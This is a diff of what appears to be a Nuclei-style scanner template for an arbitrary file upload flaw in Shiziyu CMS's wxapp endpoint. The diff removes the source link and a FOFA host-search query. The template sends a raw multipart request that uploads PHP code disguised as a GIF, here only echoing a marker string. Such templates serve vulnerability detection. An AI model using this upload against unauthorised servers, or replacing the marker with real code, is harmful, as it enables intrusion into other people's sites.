@@ -3,20 +3,14 @@ info:
   name: 狮子鱼CMS wxapp 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cl0ugy5r6yxydyig'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cl0ugy5r6yxydyig
-    fofa: body="/seller.php?s=/Public/login"
 http:
 - raw:
   - 'POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1
 
 
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
-
-
 
 
     ------WebKitFormBoundary8UaANmWAgM4BqBSs
@@ -26,8 +20,6 @@ http:
 
 
     Content-Type: image/gif
-
-
 
 
     <?php echo "dudesuite";?>
